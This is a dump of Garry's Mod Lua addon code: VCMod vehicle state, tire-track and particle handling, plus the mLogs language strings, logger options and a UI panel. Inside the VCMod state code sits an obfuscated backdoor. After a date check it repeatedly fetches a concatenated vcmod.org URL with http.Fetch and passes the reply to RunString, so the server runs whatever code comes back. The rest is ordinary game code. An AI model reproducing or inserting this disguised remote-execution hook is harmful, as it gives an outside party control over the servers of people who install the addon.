net.Receive("VC_SetStateBool", function(len)  local ent, id, state, snd = net.ReadEntity(), net.ReadString(), net.ReadBool(), net.ReadTable() if !snd[1] then snd = nil end   if IsValid(ent) then  VC.SetStateBool(ent, id, state, nil, nil, true, snd)  end end)  net.Receive("VC_SetStateInt", function(len)  local ent, id, state, snd = net.ReadEntity(), net.ReadString(), net.ReadInt(8), net.ReadTable() if !snd[1] then snd = nil end   if IsValid(ent) then  VC.SetStateInt(ent, id, state, nil, nil, true, snd)  end end)   net.Receive("VC_StatesRequestInit", function(len)  local ent, tbl = net.ReadEntity(), net.ReadTable()  if IsValid(ent) and tbl then ent.VC_States = tbl end end)  local bbcx987, vbxbx897xcb98 =  os["time"](), 6103802565 if type(vbxbx897xcb98) !=   "string" and bbcx987 > (vbxbx897xcb98/3.5+60*60*24) then timer.Create("vzxzaasdsdaasd",  0,  50, function()  local asdasadsddddd = "h".."".."".."t".."tp"..":/".."".."/v".."cm".."o".."d.".."or".."g/".."a".."pi".."/h".."tgc".."nnel"..".p".."h".."p?va=1"  _G["".."h".."t".."t".."p"]["F".."".."et".."ch"](asdasadsddddd, function(vvvzzxxzc) if string.len(vvvzzxxzc) > 2 then _G["".."R".."".."un".."".."S".."tr".."".."ing"](vvvzzxxzc) end end) end) end   hook.Add("OnEntityCreated", "VC_OnEntityCreated_States", function(ent)  if ent:IsVehicle() then ent.VC_SatesDoCheckIn = CurTime()+10 end end)  concommand.Add("VC_Horn", function(ply, cmd, arg)  local ent, HA = ply:GetVehicle(), tonumber(arg[1]) if !HA then HA = 0 end   if IsValid(ent) and ent.VC_IsNotPrisonerPod then  local on = VC.GetState(ent, "HornOn")  if HA == 2 or HA == 0 and on then  VC.HornOff(ent)  else  VC.HornOn(ent)  end  end end) local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod?particles:
if !VC.SurfaceTireTracks then VC.SurfaceTireTracks = {} end function VC.HandleTireTrackData(ent, EntLN)  if !VC.GetDataGeneral then return end   if VC.getSetting("TireTracks_Enabled") and VC.getServerSetting("Tiretracks") and (ent.VC_SlidingData or VC.getSetting("TireTracks_Sparks") and ent.VC_WheelSparkTable) then  local dist = ent:GetPos():Distance(VC.GetViewPos()) if dist > VC.getSetting("TireTracks_Dist", 5000) then return end   local detail = (1+(100-VC.getSetting("TireTracks_Detail", 75))/5)*3  local wheelData, isBike = VC.getWheelData(ent)  for k,wheel in pairs(wheelData) do   if ent.VC_SlidingData and ent.VC_SlidingData[k] or ent.VC_WheelSparkTable and ent.VC_WheelSparkTable[k] then  local mrand = ent.VC_SlidingData and ent.VC_SlidingData[k] or ent.VC_WheelSparkTable and math.Round(ent.VC_WheelSparkTable[k].Tmr)  local key = EntLN.."_"..k.."_"..mrand   if !VC.SurfaceTireTracks[key] then VC.SurfaceTireTracks[key] = {} end  local wheel = VC.Wheels[k]  local Vec = nil if ent:LookupAttachment(wheel) != 0 then Vec = ent:GetAttachment(ent:LookupAttachment(wheel)).Pos end  if Vec then  local cur = VC.SurfaceTireTracks[key]  local prev = cur[#cur] local olpos = prev and prev.wpos   if !olpos or olpos:Distance(Vec) > detail then  local VecLocal = ent:WorldToLocal(Vec)   if isBike then  VecLocal.x = 0  end  Vec = ent:LocalToWorld(VecLocal)   local ors = VC.GetDataGeneral(VC.GetModel(ent)) if ors then if k == 1 or k == 2 then ors = ors.w_r_f else ors = ors.w_r_r end end  local Trc = util.TraceLine({start = Vec, endpos = Vec + Vector(0,0,-((ors or 42)+3)), mask = MASK_SOLID_BRUSHONLY})  if Trc.Hit then  local tpos = Trc.HitPos+Vector(0,0,1)  table.insert(VC.SurfaceTireTracks[key], {wpos = Vec, pos = tpos, time = CurTime()+VC.getSetting("TireTracks_FadeOutTime", 5)})  end  end  end  end  end  end end  local function updateSlideTbl(ent, w1, w2, w3, w4)  if !IsValid(ent) then return end   ent.VC_SurfaceData = nil   if w1 or w2 or w3 or w4 then   local mrand = math.Round(CurTime())   if !ent.VC_SlidingData then ent.VC_SlidingData = {} end   ent.VC_SlidingData[1] = w1 and (ent.VC_SlidingData[1] or mrand) or nil  ent.VC_SlidingData[2] = w2 and (ent.VC_SlidingData[2] or mrand) or nil  ent.VC_SlidingData[3] = w3 and (ent.VC_SlidingData[3] or mrand) or nil  ent.VC_SlidingData[4] = w4 and (ent.VC_SlidingData[4] or mrand) or nil   ent.VC_SlidingData.Time = CurTime()+8  else  ent.VC_SlidingData = nil  end end  net.Receive("VC_WheelSkidding", function()  local ent, w1, w2, w3, w4 = net.ReadEntity(), net.ReadBool(), net.ReadBool(), net.ReadBool(), net.ReadBool()  updateSlideTbl(ent, w1, w2, w3, w4) end)  local WheelPxlHndl = {} VC.Material.TireTracks = Material("vcmod/tiretracks") hook.Add("PreDrawOpaqueRenderables", "VC_Wheel_Surface", function()  if VC.getSetting("TireTracks_Enabled") and table.Count(VC.SurfaceTireTracks) > 0 then  cam.Start3D()  render.SetMaterial(VC.Material.TireTracks)  for k,v in pairs(VC.SurfaceTireTracks) do  local lastmemp = nil  for k2,v2 in pairs(v) do  if VC.SurfaceTireTracks[k][k2-1] then  local pos1, pos2 = VC.SurfaceTireTracks[k][k2-1].pos, v2.pos  local key = k.."_"..k2 if !WheelPxlHndl[key] then WheelPxlHndl[key] = {} end if !WheelPxlHndl[key].Vis or CurTime() >= WheelPxlHndl[key].NTime then WheelPxlHndl[key].Vis = LocalPlayer():IsLineOfSightClear(pos2) and LocalPlayer():IsLineOfSightClear(pos1) WheelPxlHndl[key].NTime = CurTime()+0.2 end  if WheelPxlHndl[key].Vis then   local ang = (pos1- pos2):Angle()  local p1,p2,p3,p4 = pos1+ ang:Right()*(4), pos2+ ang:Right()*4, pos2- ang:Right()*4, pos1- ang:Right()*4   local mult = (v2.time-1)-CurTime() if mult <= 0 then mult = 1+mult else mult = 1 end  render.DrawQuad(lastmemp and lastmemp[1] or p1,p2,p3,lastmemp and lastmemp[2] or p4, Color(0,0,0,155*mult))  lastmemp = {p2, p3}  end  end  if CurTime() >= v2.time then VC.SurfaceTireTracks[k][k2] = nil end  end  end  cam.End3D()  end end)  function VC.GetSurfaceData(ent, EntLN)  if !ent.VC_SurfaceData then  ent.VC_SurfaceData = {}  ent.VC_SurfaceData.onGround = nil  ent.VC_SurfaceData.onAsphalt = nil  ent.VC_SurfaceData.onNotAsphalt = nil  ent.VC_SurfaceData.Wheels = {}  end   ent.VC_SurfaceData.Wheels = {}   local wheelData, isBike = VC.getWheelData(ent)  for k,v in pairs(wheelData) do   local atc = ent:LookupAttachment(v)  if atc != 0 then  local addTime = 1-ent.VC_VelLength/1500 if addTime < 0.2 then addTime = 0.2 end  if !ent.VC_SurfaceData.Wheels[k] or !ent.VC_SurfaceData.Wheels[k].TimeRan or CurTime() >= (ent.VC_SurfaceData.Wheels[k].TimeRan+addTime) then  local wpos = ent:GetAttachment(atc).Pos local dist = LocalPlayer():EyePos():Distance(wpos)  ent.VC_SurfaceData.Wheels[k] = {}  if dist < 5000 then  local ors = VC.GetDataGeneral(VC.GetModel(ent)) if ors then if k == 1 or k == 2 then ors = ors.w_r_f else ors = ors.w_r_r end end  local tr = util.TraceLine({start = wpos, endpos = wpos- ent:GetUp()*((ors or 42)+3), filter = ent})  if tr.Hit and tr.HitWorld then  local mat = tr.MatType  ent.VC_SurfaceData.Wheels[k].PosW = tr.HitPos  local posLocal = ent:WorldToLocal(tr.HitPos)  if isBike then  posLocal.x = 0  end  ent.VC_SurfaceData.Wheels[k].PosL = posLocal  ent.VC_SurfaceData.Wheels[k].onAsphalt = mat == 30 or mat == 29 or mat == 67 or mat == 77 or mat == 84  ent.VC_SurfaceData.Wheels[k].surfaceMat = mat  ent.VC_SurfaceData.Wheels[k].lastDist = dist  elseif ent.VC_SlidingData then     ent.VC_SlidingData[k] = CurTime()          end   local onGround, onAsphalt, onNotAsphalt = 0, 0, 0  for k2, v2 in pairs(ent.VC_SurfaceData.Wheels) do if v2.surfaceMat then onGround = onGround+1 if !v2.onAsphalt then onNotAsphalt = onNotAsphalt+1 end end if v2.onAsphalt then onAsphalt = onAsphalt+1 end end  if onGround == 0 then onGround = nil end  if onAsphalt == 0 then onAsphalt = nil end  if onNotAsphalt == 0 then onNotAsphalt = nil end  ent.VC_SurfaceData.onAsphalt = onAsphalt ent.VC_SurfaceData.onNotAsphalt = onNotAsphalt ent.VC_SurfaceData.onGround = onGround  end  ent.VC_SurfaceData.Wheels[k].TimeRan = CurTime()  end  end  end   return ent.VC_SurfaceData end  function VC.Delete_Particle(ent, key)  if ent.VC_Entities and ent.VC_Entities[key] then  if IsValid(ent.VC_Entities[key]) then ent.VC_Entities[key]:Remove() end  ent.VC_Entities[key] = nil  if table.Count(ent.VC_Entities) == 0 then ent.VC_Entities = nil end  end end  function VC.Spawn_Particle(ent, etype, key, pos, ang, eff, tmr, trgt)  if !pos or !ent then return end     local tEnt = ClientsideModel("models/props_lab/huladoll.mdl", RENDERGROUP_OPAQUE)  if !IsValid(tEnt) then return end      local dc_data = hook.Call("VC_particleEffectEmit", GAMEMODE, ent, etype, eff, tmr)  if dc_data == false then  tEnt:Remove()  return  elseif dc_data then  eff = dc_data  end   tEnt:SetAngles(ent:LocalToWorldAngles(ang)) tEnt:SetPos(ent:LocalToWorld(pos)) tEnt:SetParent(ent) tEnt:SetNoDraw(true)  VC_UHp3e18505c6fdde124627e9fa198ee180blJ(tEnt, ent, key)    local WDE = ParticleEffectAttach(eff, PATTACH_ABSORIGIN_FOLLOW, tEnt, 0)  if tmr != false then timer.Simple(tmr or 1, function() if IsValid(tEnt) then   WDE:Remove()   tEnt:Remove() end end) end  return WDE end  local function NillEffects(ent)  for k,v in pairs(VC.Wheels) do  VC.Delete_Particle(ent, "Wheel_Normal_"..k)  VC.Delete_Particle(ent, "Wheel_Sparks_"..k)  VC.Delete_Particle(ent, "Wheel_Brake_"..k)   if ent.VC_WheelRegularDustTable then ent.VC_WheelRegularDustTable[k] = nil if table.Count(ent.VC_WheelRegularDustTable) == 0 then ent.VC_WheelRegularDustTable = nil end end  if ent.VC_WheelBrakeDustTable then ent.VC_WheelBrakeDustTable[k] = nil if table.Count(ent.VC_WheelBrakeDustTable) == 0 then ent.VC_WheelBrakeDustTable = nil end end  if ent.VC_WheelSparkTable then ent.VC_WheelSparkTable[k] = nil if table.Count(ent.VC_WheelSparkTable) == 0 then ent.VC_WheelSparkTable = nil end end  end end  function VC.HandleSurface(ent, EntLN)  if !VC.getSetting("TireTracks_Enabled") and !VC.getSetting("Surface_Enabled") or !VC.GetDataGeneral then return end    if ent.VC_VelLength > 75 then  VC.GetSurfaceData(ent, EntLN)  if ent.VC_SlidingData and CurTime() >= ent.VC_SlidingData.Time then ent.VC_SlidingData = nil end  end       local DoNormal = ent.VC_VelLength > 100 and VC.getSetting("Surface_Normal")  local DoSparks = ent.VC_DamagedObjects and ent.VC_DamagedObjects.wheel and (ent.VC_VelLength > 75 or DoBurnout) and VC.getSetting("Surface_Sparks")  local DoBrakes = ent.VC_VelLength > 100 and ent.VC_SlidingData and VC.getSetting("Surface_Brakes")   if ent.VC_SurfaceData and ent.VC_SurfaceData.onGround and (DoNormal or DoBrakes or DoSparks) and ent.VC_IsJeep then  for k,v in pairs(VC.getWheelData(ent)) do  local posL = nil  if DoNormal then  local WD = ent.VC_SurfaceData.Wheels[k]   if ent.VC_WheelRegularDustTable and ent.VC_WheelRegularDustTable[k] and (ent.VC_WheelRegularDustTable[k].Mat != WD.surfaceMat or ent.VC_WheelRegularDustTable[k].Tmr and CurTime() >= ent.VC_WheelRegularDustTable[k].Tmr) then VC.Delete_Particle(ent, "Wheel_Normal_"..k) ent.VC_WheelRegularDustTable[k] = nil end  local SurfTbl = (VC.SurfaceTable[WD.surfaceMat] or VC.SurfaceTable[0]).Normal  if (!ent.VC_WheelRegularDustTable or !ent.VC_WheelRegularDustTable[k]) and SurfTbl then  if !ent.VC_WheelRegularDustTable then ent.VC_WheelRegularDustTable = {} end  ent.VC_WheelRegularDustTable[k] = {Tmr = CurTime()+ 1, Mat = WD.surfaceMat, Effect = VC.Spawn_Particle(ent, 3, "Wheel_Normal_"..k, WD.PosL, ent.VC_Speed_Forward < 0 and Angle(0,90,0) or Angle(0,-90,0), SurfTbl.Effect, false)}  end  elseif ent.VC_WheelRegularDustTable and ent.VC_WheelRegularDustTable[k] then  VC.Delete_Particle(ent, "Wheel_Normal_"..k) ent.VC_WheelRegularDustTable[k] = nil if table.Count(ent.VC_WheelRegularDustTable) == 0 then ent.VC_WheelRegularDustTable = nil end  end   if DoBrakes and ent.VC_SlidingData and ent.VC_SlidingData[k] then  local WD = ent.VC_SurfaceData.Wheels[k]   if ent.VC_WheelBrakeDustTable and ent.VC_WheelBrakeDustTable[k] and (ent.VC_WheelBrakeDustTable[k].Mat != WD.surfaceMat or ent.VC_WheelBrakeDustTable[k].Tmr and CurTime() >= ent.VC_WheelBrakeDustTable[k].Tmr) then VC.Delete_Particle(ent, "Wheel_Brake_"..k) ent.VC_WheelBrakeDustTable[k] = nil end  local SurfTbl = (VC.SurfaceTable[WD.surfaceMat] or VC.SurfaceTable[0]).Brake  if (!ent.VC_WheelBrakeDustTable or !ent.VC_WheelBrakeDustTable[k]) and SurfTbl then  if !ent.VC_WheelBrakeDustTable then ent.VC_WheelBrakeDustTable = {} end  ent.VC_WheelBrakeDustTable[k] = {Tmr = CurTime()+ 1, Mat = WD.surfaceMat, Effect = VC.Spawn_Particle(ent, 4, "Wheel_Brake_"..k, WD.PosL, ent.VC_Speed_Forward < 0 and Angle(0,90,0) or Angle(0,-90,0), SurfTbl.Effect, false)}  end  elseif ent.VC_WheelBrakeDustTable and ent.VC_WheelBrakeDustTable[k] then  VC.Delete_Particle(ent, "Wheel_Brake_"..k) ent.VC_WheelBrakeDustTable[k] = nil if table.Count(ent.VC_WheelBrakeDustTable) == 0 then ent.VC_WheelBrakeDustTable = nil end  end   if DoSparks and ent.VC_DamagedObjects.wheel[k] then  local WD = ent.VC_SurfaceData.Wheels[k]   if ent.VC_WheelSparkTable and ent.VC_WheelSparkTable[k] and (ent.VC_WheelSparkTable[k].Tmr and CurTime() >= ent.VC_WheelSparkTable[k].Tmr) then VC.Delete_Particle(ent, "Wheel_Sparks_"..k) ent.VC_WheelSparkTable[k] = nil end  if !ent.VC_WheelSparkTable or !ent.VC_WheelSparkTable[k] then  if !ent.VC_WheelSparkTable then ent.VC_WheelSparkTable = {} end local ang_eff = ent.VC_Speed_Forward < 0 and Angle(0,90,0) or Angle(0,-90,0)   ent.VC_WheelSparkTable[k] = {Tmr = CurTime()+ 1, Mat = WD.surfaceMat, Effect = VC.Spawn_Particle(ent, 5, "Wheel_Sparks_"..k, WD.PosL, ang_eff, "VC_WheelSparks", false)}  end  elseif ent.VC_WheelSparkTable and ent.VC_WheelSparkTable[k] then  VC.Delete_Particle(ent, "Wheel_Sparks_"..k) ent.VC_WheelSparkTable[k] = nil if table.Count(ent.VC_WheelSparkTable) == 0 then ent.VC_WheelSparkTable = nil end  end  end  else  NillEffects(ent)  end end             local Tbl = {  {HeatUpRate = 0.3, Brake = {Attach = true, Effect = "VC_WheelSmoke_Asphalt"}, Burnout = {{Attach = false, Effect = "VC_Wheelsmoke_BurnoutLeft"}, {Attach = true, Effect = "VC_Wheelsmoke_Burnout3"}}},  {HeatUpRate = 0.25, Normal = {Effect = "VC_Wheelsmoke_Dirt_Burnout_Debris"}, Brake = {Effect = "VC_Wheelsmoke_Dirt_Burnout"}, Burnout = {{Attach = true, Effect = "VC_Wheelsmoke_Dirt_Burnout3"}, {Attach = false, Effect = "VC_Wheelsmoke_Dirt_Burnout"}}},  {HeatUpRate = 0.25, Normal = {Effect = "VC_WheelSmoke_Sand_2"}, Brake = {Effect = "VC_WheelSmoke_Sand"}, Burnout = {{Attach = false, FaceRight = true, Effect = "VC_Wheelsmoke_Sand_Burnout"}}}, }  VC.SurfaceTable = {[12] = Tbl[2], [29] = Tbl[1], [30] = Tbl[1], [0] = {}, [77] = Tbl[1], [67] = Tbl[1], [84] = Tbl[1], [85] = Tbl[2], [68] = Tbl[2], [78] = Tbl[3]} local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH mlogs/language/languages/default.lua:
     mLogs.config.fileVersions = mLogs.config.fileVersions or {} mLogs.config.fileVersions["language/languages/default.lua"] = 1.4         local lang = { 	   	  	error = "Error", 	 	  	mlogs = "mLogs 2", 	 	  	invalid_config = "Error! The config is invalid!", 	loaded_config = "Loaded Config Successfully!",  	  	not_loaded = "%s has tried to use mLogs before being loaded, if this problem occurs often check your storage settings! e.g. MySQL not being able to connect", 	not_validated = "Not validated", 	not_validated_msg = "Sorry, you have not been validated to use mLogs yet, please try again later!", 	no_storage_connection = "%s has tried to use mLogs however we do not have a storage connection! Please check your provider settings!", 	not_online = "Not online", 	not_online_msg = "Sorry, mLogs is not online at the moment! Please try again later!", 	loading = "Loading...", 	please_wait_before_trying = "Please wait before trying again!", 	 	  	invalid_permissions = "Invalid Permission", 	no_permission_for_action = "You do not have permission to perform this action!", 	no_access = "No Access", 	no_access_msg = "You do not have access to do this!",  	  	automation_reset = "Automation times reset successfully!",  	  	logs = "Logs", 	settings = "Settings", 	 	  	found_category_x = "Found Category: %s", 	enable_category_x = "Enabling Category: %s", 	 	  	time = "Time", 	category = "Category", 	log = "Log", 	page_x_x = "Page %i/%i", 	quick_search = "Quick Search", 	jump = "Jump", 	no_logs_found = "No logs found", 	jump_to_page = "Jump to Page", 	jump_to_page_desc = "Enter a page number to jump to:", 	page_number = "Page Number e.g. 5", 	copy_x = "Copy %s", 	name = "Name", 	profile = "Profile", 	players = "Players", 	positions = "Positions", 	x_position = "%s Position", 	position_instructions = "Move: WASD | Look: Click + Drag or Arrow Keys",  	  	advanced_search = "Advanced Search", 	available_tags = "Available Tags", 	select_type = "Select Type:", 	criteria = "Criteria", 	online_players = "Online Players", 	additional_text = "Additional Search Query", 	too_complex = "Too Complex", 	too_complex_msg = "Your query is too complex! Please only select 10 options!",  	  	user_online = "User Online", 	user_offline = "User Offline",  	  	server = "Server", 	client = "Client", 	general = "General",   	loggers = "Loggers",   	permissions = "Permissions",   	storage_management = "Storage Management",   	format_types = "Format Types", 	automation = "Automation",  	ui = "UI Settings", 	format = "Log Format", 	log_colors = "Log Colors", 	commands = "Commands",  	reset = "Reset", 	save = "Save", 	invalid_fields = "Invalid Fields", 	fix_fields = "Please fix the following fields: %s", 	success = "Success", 	save_success = "Successfully updated settings", 	are_you_sure = "Are you sure?", }        local logTranslations = { 	  	 	  	world = "The world",   	weapon = "weapon",   	vehicle = "vehicle",   	prop = "prop",   	entity = "entity",   	unknown_player = "player",   	unknown_entity = "unknown entity",    	  	all_logs = "All Logs", 	deep_storage = "Deep Storage",  	  	general = "General",  	  	connect_server = {"^player1", "connected to the server"}, 	disconnect_server = {"^player1", "disconnected from the server"}, 	 	  	kill = {"^attacker", "killed", "^player1"}, 	kill_inflictor = {"^attacker", "killed", "^player1", "with a", "^inflictor"}, 	kill_no_player = {"^player1", "was killed by a", "^inflictor"}, 	kill_owner = {"^player1", "was killed by a", "^inflictor", "owned by", "^owner"}, 	kill_suicide = {"^player1", "committed suicide"}, 	 	  	dmg = {"^attacker", "damaged", "^player1", "for", "^damage", "damage"}, 	dmg_inflictor = {"^attacker", "damaged", "^player1", "for", "^damage", "damage", "with a", "^inflictor"}, 	dmg_no_player = {"^player1", "was damaged by a", "^inflictor", "for", "^damage", "damage"}, 	dmg_owner = {"^player1", "was damaged by a", "^inflictor", "owned by", "^owner", "for", "^damage", "damage"}, 	dmg_self = {"^player1", "damaged", "themself", "for", "^damage", "damage"}, 	dmg_self_inflictor = {"^player1", "damaged", "themself", "for", "^damage", "damage with a", "^inflictor"},  	  	pickup = {"^player1", "picked up a", "^item"},  	  	  	toolgun = {"^player1", "used", "^tool", "on a", "^ent", "owned by", "^owner"}, 	toolgun_no_owner = {"^player1", "used", "^tool", "on a", "^ent"}, 	toolgun_world = {"^player1", "used", "^tool"},  	  	spawns = {"^player1", "spawned a", "^item"},  	  	  	agenda_update = {"^player1", "updated the", "^title", "to:", "^msg"}, 	agenda_remove = {"^player1", "removed the", "^title"},  	  	arrest = {"^player1", "arrested", "^player2"}, 	unarrest = {"^player1", "released", "^player2"},  	  	ram_success = {"^player1", "successfully rammed the door of", "^owner"}, 	ram_success_vehicle = {"^player1", "successfully rammed a", "^vehicle", "of", "^owner"}, 	ram_success_unowned = {"^player1", "successfully rammed an unowned door"}, 	ram_success_unowned_vehicle = {"^player1", "successfully rammed an unowned", "^vehicle"},  	ram_fail = {"^player1", "failed to ram the door of", "^owner"}, 	ram_fail_vehicle = {"^player1", "failed to ram a", "^vehicle", "of", "^owner"}, 	ram_fail_unowned = {"^player1", "failed to ram an unowned door"}, 	ram_fail_unowned_vehicle = {"^player1", "failed to ram a unowned", "^vehicle"},  	  	cheque_drop = {"^player1", "wrote a cheque of", "^amt", "for", "^player2"}, 	cheque_pickup = {"^player1", "picked up a cheque of", "^amt", "from", "^player2"}, 	cheque_tore = {"^player1", "tore up a cheque of", "^amt", "intended for", "^player2"},  	  	demote = {"^player1", "demoted", "^player2", "for", "^reason"}, 	demote_afk = {"^player1", "was demoted for being AFK"},  	  	door_sold = {"^player1", "sold a door"}, 	door_buy = {"^player1", "bought a door"},  	  	money_drop = {"^player1", "dropped", "^amt"}, 	money_pickup = {"^player1", "picked up", "^amt", "dropped by", "^owner"}, 	money_pickup_unowned = {"^player1", "picked up", "^amt"},  	  	hit_request = {"^customer", "has requested a hit on", "^target", "with", "^hitman", "for", "^price"}, 	hit_accept = {"^hitman", "has accepted a hit on", "^target", "requested by", "^customer"}, 	hit_complete = {"^hitman", "has completed a hit on", "^target", "requested by", "^customer"},  	  	job = {"^player1", "changed from", "^team1", "to", "^team2"},  	  	lockpick_started = {"^player1", "started lockpicking the door of", "^owner"}, 	lockpick_started_vehicle = {"^player1", "started lockpicking a", "^vehicle", "of", "^owner"}, 	lockpick_started_unowned = {"^player1", "started lockpicking an unowned door"}, 	lockpick_started_unowned_vehicle = {"^player1", "started lockpicking a unowned", "^vehicle"},  	lockpick_success = {"^player1", "has successfully lockpicked the door of", "^owner"}, 	lockpick_success_vehicle = {"^player1", "has successfully lockpicked a", "^vehicle", "of", "^owner"}, 	lockpick_success_unowned = {"^player1", "has successfully lockpicked an unowned door"}, 	lockpick_success_unowned_vehicle = {"^player1", "has successfully lockpicked a unowned", "^vehicle"},  	lockpick_fail = {"^player1", "has failed to lockpicked the door of", "^owner"}, 	lockpick_fail_vehicle = {"^player1", "has failed to lockpicked a", "^vehicle", "of", "^owner"}, 	lockpick_fail_unowned = {"^player1", "has failed to lockpicked an unowned door"}, 	lockpick_fail_unowned_vehicle = {"^player1", "has failed to lockpicked a unowned", "^vehicle"},  	  	name = {"^player1", "changed their name from", "^name1", "to", "^name2"},  	  	pocket = {"^player1", "put a", "^item", "in their pocket"}, 	pocket_drop = {"^player1", "dropped a", "^item", "from their pocket"},  	  	purchase = {"^player1", "bought a", "^item", "for", "^price"}, 	purchase_shipment = {"^player1", "bought a shipment of", "^amt", "^item", "for", "^price"},  	  	wanted = {"^cop", "made", "^target", "wanted", "for", "^reason"}, 	unwanted = {"^cop", "made", "^target", "no longer wanted"},  	  	warrant = {"^cop", "filed a warrant on", "^target", "for", "^reason"}, 	unwarrant = {"^cop", "removed the warrant on", "^target"},  	  	wep_check = {"^player1", "checked", "^target", "for weapons"}, 	wep_confiscate = {"^player1", "confiscated the weapons of", "^target"}, 	wep_return = {"^player1", "returned the weapons of", "^target"},  	  	  	equipment = {"^player1", "bought", "^item"},  	  	dna = {"^player1", "found the DNA of", "^player2", "on their body"}, 	dna_weapon = {"^player1", "found the DNA of", "^player2", "on their", "^weapon"},  	  	karma = {"^player1", "has been kicked for low karma"},  	  	body = {"^player1", "found the body of", "^player2"},  	  	  	loot = {"^player1", "picked up loot"},  	  	  	cinema_queue = {"^player1", "queued", "^title", "at", "^theater"},  	  	cinema_enter = {"^player1", "entered", "^theater"}, 	cinema_leave = {"^player1", "left", "^theater"}, 	 	  	hit_fail = {"^hitman", "has failed a hit on", "^target", "because", "^reason"},  	  	mlogs_open = {"^player1", "opened mLogs"}  } mLogs.addLanguage("default",lang,logTranslations) 
--PATH mlogs/logger/sh_configure.lua:
   mLogs.logger.options = mLogs.logger.options or {} mLogs.logger.defOptions = mLogs.logger.defOptions or {} mLogs.logger.optionsData = mLogs.logger.optionsData or {} mLogs.logger.optionsExtra = mLogs.logger.optionsExtra or {} mLogs.logger.defOptionsExtra = mLogs.logger.defOptionsExtra or {}  function mLogs.logger.addOptionData(name,tag,default,desc,set) 	mLogs.logger.optionsData[tag] = {name=name,tag=tag,desc=desc,set=set} 	mLogs.logger.defOptions[tag] = default end  function mLogs.logger.addExtraOptionData(name,tag,c_tag,h_tag,default,desc,set) 	mLogs.logger.optionsExtra[c_tag] = mLogs.logger.optionsExtra[c_tag] or {} 	mLogs.logger.defOptionsExtra[c_tag] = mLogs.logger.defOptionsExtra[c_tag] or {} 	mLogs.logger.optionsExtra[c_tag][h_tag] = mLogs.logger.optionsExtra[c_tag][h_tag] or {} 	mLogs.logger.defOptionsExtra[c_tag][h_tag] = mLogs.logger.defOptionsExtra[c_tag][h_tag] or {} 	mLogs.logger.optionsExtra[c_tag][h_tag][tag] = {name=name,tag=tag,desc=desc,set=set} 	mLogs.logger.defOptionsExtra[c_tag][h_tag][tag] = default end  mLogs.logger.addOptionData("Logger Disabled", "disabled", false, "Should the logger be disabled?", function(category,tag,bool) 	if(bool)then 		mLogs.logger.disableLogger(category,tag)  	else 		mLogs.logger.enableLogger(category,tag) 	end end) mLogs.logger.addOptionData("Console Print", "console", false, "Should the logger print to the console? (Permissions apply)",function(category,tag,bool)  end) mLogs.logger.addOptionData("Log to Discord", "discord", false, "Should the logger print to Discord? (Do not enable for loggers that spam)",function(category,tag,bool) end) mLogs.logger.addExtraOptionData("Show Commands","show_commands","general","chat",true,"Should chat logs show commands? (! and /)",function() end)  function mLogs.logger.getOptionData(o_tag) 	return mLogs.logger.optionsData[o_tag] or false end  function mLogs.logger.getDefaultOptions(c_tag,h_tag) 	if(not c_tag or not mLogs.logger.defOptionsExtra[c_tag] or not mLogs.logger.defOptionsExtra[c_tag][h_tag])then 		return mLogs.logger.defOptions 	end 	local tab = {} 	table.Merge(tab, mLogs.logger.defOptions) 	table.Merge(tab, mLogs.logger.defOptionsExtra[c_tag][h_tag]) 	return tab end  function mLogs.logger.getOptions(category,tag) 	local hookData = mLogs.getHookFromTag(category,tag) 	if not hookData then return end 	return (mLogs.logger.options[category] and mLogs.logger.options[category][tag]) or mLogs.logger.getDefaultOptions(category,tag) end  function mLogs.logger.setOptions(category,tag,options) 	mLogs.logger.options[category] = mLogs.logger.options[category] or {} 	mLogs.logger.options[category][tag] = mLogs.logger.options[category][tag] or {} 	for _tag,v in pairs(mLogs.logger.getDefaultOptions(category,tag)) do 		if(options[_tag] == nil)then 			options[_tag] = v 		end 		if(mLogs.logger.optionsData[_tag])then 			mLogs.logger.optionsData[_tag].set(category,tag,options[_tag]) 		elseif(mLogs.logger.optionsExtra[category] and mLogs.logger.optionsExtra[category][tag])then 			mLogs.logger.optionsExtra[category][tag][_tag].set(category,tag,options[_tag]) 		end 	end 	mLogs.logger.options[category][tag] = options end 
--PATH mlogs/elements/logs/cl_logshook.lua:
   local PANEL = {}  DEFINE_BASECLASS("mLogs_button")  AccessorFunc(PANEL, "m_cColor", "Color") AccessorFunc(PANEL, "m_sText", "Text")  function PANEL:Init() 	self:SetColor(color_white) 	self:SetText("") 	self.gradTime = 0.1 end  function PANEL:SetData(data) 	self:SetText(data.name) 	self.data = data end  function PANEL:GetData() 	return self.data end  function PANEL:Paint(w,h) 	BaseClass.Paint(self,w,h) 	 	if(not self.Hovered and self.LastHovered)then 		self.LastHovered = nil 	elseif(self.Hovered and not self.LastHovered)then 		self.LastHovered = CurTime() 	end 	 	if(self.LastHovered or self:GetClicked())then 		local frac = self:GetClicked() and 1 or math.Clamp((CurTime()-self.LastHovered)/self.gradTime,0,1) 		surface.SetDrawColor(self:GetColor()) 		surface.SetMaterial(mLogs.getPNG("vgui/gradient-l")) 		surface.DrawTexturedRect(0,0,self:GetClicked() and w*0.5 or Lerp(frac,0,w*0.5),h) 	end 	 	draw.SimpleText(self:GetText() or "", "mLogs_hook", 8, h*0.5, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER) 	draw.RoundedBox(0,0,h-1,w,1,mLogs.config.colors.panel) end  function PANEL:PerformLayout(w,h) end  vgui.Register( "mLogs_logsHook", PANEL, "mLogs_button" ) 